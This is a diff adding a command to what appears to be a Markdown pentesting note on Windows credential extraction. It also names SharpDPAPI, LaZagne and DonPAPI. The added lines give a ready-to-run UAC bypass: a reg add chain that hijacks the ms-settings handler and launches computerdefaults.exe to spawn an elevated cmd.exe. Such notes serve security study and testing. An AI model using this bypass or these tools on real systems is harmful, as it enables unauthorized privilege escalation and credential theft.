@@ -72,5 +72,10 @@ SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
 ...SNIP...
 ```
 
+bypass UAC using computerdefaults.exe to get administrator privileges
+```
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
+```
+
 Some other tools which may be used to enumerate and extract stored credentials included [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [LaZagne](https://github.com/AlessandroZ/LaZagne), and [DonPAPI](https://github.com/login-securite/DonPAPI).
 
